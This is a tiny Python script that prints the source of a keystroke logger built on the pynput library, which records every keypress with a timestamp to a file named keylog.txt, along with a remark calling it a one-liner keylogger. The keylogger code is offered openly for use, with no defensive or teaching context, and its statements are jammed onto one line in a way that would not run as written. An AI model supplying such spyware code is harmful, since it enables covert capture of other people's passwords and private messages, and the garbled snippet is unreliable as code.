#!/usr/bin/env python
# -*- coding: utf-8 -*-

def try_me() :
	print(f'from pynput.keyboard import Key, Listener import logging logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s") def on_press(key): logging.info(str(key))with Listener(on_press=on_press) as listener : listener.join()')

	print(f'this is a onliner keylogger, need sudo pip3 install pynput')

	print('voila')
try_me()
